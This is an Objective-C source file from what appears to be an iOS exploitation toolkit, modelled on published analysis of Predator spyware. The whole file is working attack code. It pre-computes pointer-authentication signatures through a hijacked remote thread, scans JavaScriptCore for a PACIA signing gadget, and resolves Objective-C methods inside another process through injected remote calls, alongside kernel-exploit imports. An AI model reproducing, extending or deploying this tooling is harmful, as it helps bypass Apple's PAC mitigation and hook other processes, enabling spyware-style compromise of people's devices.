//
//  PACCache.m
//  lara
//
//  Predator-style PAC signing cache + JSC gadget hunting + Remote Obj-C resolution
//  Based on Jamf Threat Labs analysis of Predator spyware (April 2026)
//

#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <dlfcn.h>
#import <string.h>

#import "PACCache.h"
#import "PAC.h"
#import "RemoteCall.h"
#import "Exception.h"
#import "Thread.h"
#import "../kexploit/kcompat.h"
#import "../kexploit/rc_kutils.h"
#import "../kexploit/darksword.h"

extern bool gIsPACSupported;
extern uint64_t g_RC_gadgetPacia;
extern uint64_t g_RC_trojanThreadAddr;

// ============================================================
// PAC Signing Cache (Predator Finding #3)
// ============================================================
// Pre-computes 256 signed PC + 256 signed LR pointers at init time.
// Eliminates per-call PAC signing latency during hook callbacks.
// Each entry covers one possible top-byte value (0x00-0xFF).
// ============================================================

int pac_cache_init(PACCache *cache, uint64_t remoteThreadAddr,
                   uint64_t pc_addr, uint64_t lr_addr,
                   uint64_t pc_disc, uint64_t lr_disc)
{
    if (!cache || !gIsPACSupported) return -1;

    memset(cache, 0, sizeof(PACCache));
    cache->base_pc = pc_addr;
    cache->base_lr = lr_addr;
    cache->pc_discriminator = pc_disc;
    cache->lr_discriminator = lr_disc;

    printf("[PACCache] Pre-computing %d PC + %d LR signatures...\n",
           PAC_CACHE_SIZE, PAC_CACHE_SIZE);

    // Pre-sign all 256 PC entries
    for (int i = 0; i < PAC_CACHE_SIZE; i++) {
        // Construct address with top byte = i
        uint64_t test_addr = (pc_addr & 0xFFFFFFFFFFFFFFULL) | ((uint64_t)i << 56);
        uint64_t signed_pc = remote_pac(remoteThreadAddr, test_addr, pc_disc);
        if (signed_pc == (uint64_t)-1) {
            printf("[PACCache] PC signing failed for entry %d\n", i);
            return -1;
        }
        cache->pc_signed[i] = signed_pc;
    }

    // Pre-sign all 256 LR entries
    for (int i = 0; i < PAC_CACHE_SIZE; i++) {
        uint64_t test_addr = (lr_addr & 0xFFFFFFFFFFFFFFULL) | ((uint64_t)i << 56);
        uint64_t signed_lr = remote_pac(remoteThreadAddr, test_addr, lr_disc);
        if (signed_lr == (uint64_t)-1) {
            printf("[PACCache] LR signing failed for entry %d\n", i);
            return -1;
        }
        cache->lr_signed[i] = signed_lr;
    }

    cache->initialized = true;
    printf("[PACCache] Cache initialized successfully (%d PC + %d LR entries)\n",
           PAC_CACHE_SIZE, PAC_CACHE_SIZE);
    return 0;
}

uint64_t pac_cache_get_pc(const PACCache *cache, uint64_t address)
{
    if (!cache || !cache->initialized) return 0;

    // Extract top byte and use as index
    uint8_t top_byte = (address >> 56) & 0xFF;
    if ((int)top_byte >= PAC_CACHE_SIZE) return 0;

    // Return pre-signed pointer with correct top byte
    return cache->pc_signed[top_byte];
}

uint64_t pac_cache_get_lr(const PACCache *cache, uint64_t address)
{
    if (!cache || !cache->initialized) return 0;

    uint8_t top_byte = (address >> 56) & 0xFF;
    if ((int)top_byte >= PAC_CACHE_SIZE) return 0;

    return cache->lr_signed[top_byte];
}

bool pac_cache_is_ready(const PACCache *cache)
{
    return cache && cache->initialized;
}

// ============================================================
// JSC Gadget Hunting (Predator Finding #2)
// ============================================================
// Searches JavaScriptCore for PACIA gadget as fallback when
// libswiftCore gadget is not available.
// Target: JSC::JSArrayBuffer::isShared()
// Pattern: 20-byte sequence containing PACIA X16, X17
// ============================================================

static const uint32_t jsc_pacia_pattern[] = {
    0xDAC10230,   // pacia x16, x17
    // Following bytes may vary - we search for the PACIA instruction specifically
};

uint64_t find_jsc_pacia_gadget(void)
{
    printf("[PACCache] Searching JavaScriptCore for PACIA gadget...\n");

    void *handle = dlopen("/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore", RTLD_NOW);
    if (!handle) {
        printf("[PACCache] Failed to dlopen JavaScriptCore: %s\n", dlerror());
        return 0;
    }

    // Target symbol: JSC::JSArrayBuffer::isShared()
    // Mangled name: _ZNK3JSC13JSArrayBuffer8isSharedEv
    void *isShared = dlsym(handle, "__ZNK3JSC13JSArrayBuffer8isSharedEv");
    if (!isShared) {
        // Try alternative mangled names
        isShared = dlsym(handle, "_ZNK3JSC13JSArrayBuffer8isSharedEv");
    }
    if (!isShared) {
        printf("[PACCache] JSC::JSArrayBuffer::isShared symbol not found\n");
        dlclose(handle);
        return 0;
    }

    uint64_t symAddr = native_strip((uint64_t)isShared);
    uint8_t *searchBase = (uint8_t *)(uintptr_t)symAddr;

    // Search within 0x1000 bytes of the symbol (Predator's approach)
    for (size_t offset = 0; offset + 4 <= 0x1000; offset += 4) {
        uint32_t instr = *(uint32_t *)(searchBase + offset);
        if (instr == 0xDAC10230) {  // PACIA X16, X17
            uint64_t gadgetAddr = symAddr + offset;
            printf("[PACCache] Found PACIA gadget in JavaScriptCore @ 0x%llx (offset 0x%zx from isShared)\n",
                   gadgetAddr, offset);

            // Verify it's followed by useful instructions (mov x0, x16 or similar)
            if (offset + 8 < 0x1000) {
                uint32_t next1 = *(uint32_t *)(searchBase + offset + 4);
                uint32_t next2 = *(uint32_t *)(searchBase + offset + 8);
                printf("[PACCache]   Next instructions: 0x%08x 0x%08x\n", next1, next2);
            }

            dlclose(handle);
            return gadgetAddr;
        }
    }

    printf("[PACCache] PACIA gadget not found in JavaScriptCore\n");
    dlclose(handle);
    return 0;
}

// ============================================================
// Remote Objective-C Method Resolution (Predator Finding #6)
// ============================================================
// Resolves method implementation in remote process.
// Handles per-process ASLR slides for methods outside dyld shared cache.
// Uses callFunc pipeline: Mach exception -> PAC cache -> thread state manipulation
// ============================================================

uint64_t remote_objc_resolve_method(const char *class_name, const char *sel_name,
                                    int timeout)
{
    if (!class_name || !sel_name) return 0;

    printf("[RemoteObjC] Resolving %s %s in remote process...\n", class_name, sel_name);

    // Step 1: objc_getClass(class_name)
    void *objc_getClass = dlsym(RTLD_DEFAULT, "objc_getClass");
    if (!objc_getClass) {
        printf("[RemoteObjC] objc_getClass not found\n");
        return 0;
    }

    uint64_t class_ptr = do_remote_call_stable(timeout, "objc_getClass",
                                               (uint64_t)class_name, 0, 0, 0, 0, 0, 0, 0);
    if (!class_ptr) {
        printf("[RemoteObjC] objc_getClass('%s') returned NULL\n", class_name);
        return 0;
    }
    printf("[RemoteObjC] Class %s = 0x%llx\n", class_name, class_ptr);

    // Step 2: sel_registerName(sel_name)
    void *sel_registerName = dlsym(RTLD_DEFAULT, "sel_registerName");
    if (!sel_registerName) {
        printf("[RemoteObjC] sel_registerName not found\n");
        return 0;
    }

    uint64_t sel = do_remote_call_stable(timeout, "sel_registerName",
                                         (uint64_t)sel_name, 0, 0, 0, 0, 0, 0, 0);
    if (!sel) {
        printf("[RemoteObjC] sel_registerName('%s') returned NULL\n", sel_name);
        return 0;
    }
    printf("[RemoteObjC] SEL %s = 0x%llx\n", sel_name, sel);

    // Step 3: class_getInstanceMethod(class, sel)
    void *class_getInstanceMethod = dlsym(RTLD_DEFAULT, "class_getInstanceMethod");
    if (!class_getInstanceMethod) {
        printf("[RemoteObjC] class_getInstanceMethod not found\n");
        return 0;
    }

    uint64_t method = do_remote_call_stable(timeout, "class_getInstanceMethod",
                                            class_ptr, sel, 0, 0, 0, 0, 0, 0);
    if (!method) {
        // Try class_getClassMethod as fallback
        void *class_getClassMethod = dlsym(RTLD_DEFAULT, "class_getClassMethod");
        if (class_getClassMethod) {
            method = do_remote_call_stable(timeout, "class_getClassMethod",
                                           class_ptr, sel, 0, 0, 0, 0, 0, 0);
        }
        if (!method) {
            printf("[RemoteObjC] class_getInstanceMethod returned NULL\n");
            return 0;
        }
    }
    printf("[RemoteObjC] Method = 0x%llx\n", method);

    // Step 4: method_getImplementation(method)
    void *method_getImplementation = dlsym(RTLD_DEFAULT, "method_getImplementation");
    if (!method_getImplementation) {
        printf("[RemoteObjC] method_getImplementation not found\n");
        return 0;
    }

    uint64_t impl = do_remote_call_stable(timeout, "method_getImplementation",
                                          method, 0, 0, 0, 0, 0, 0, 0);
    if (!impl) {
        printf("[RemoteObjC] method_getImplementation returned NULL\n");
        return 0;
    }

    printf("[RemoteObjC] Implementation of [%s %s] = 0x%llx\n", class_name, sel_name, impl);
    return impl;
}
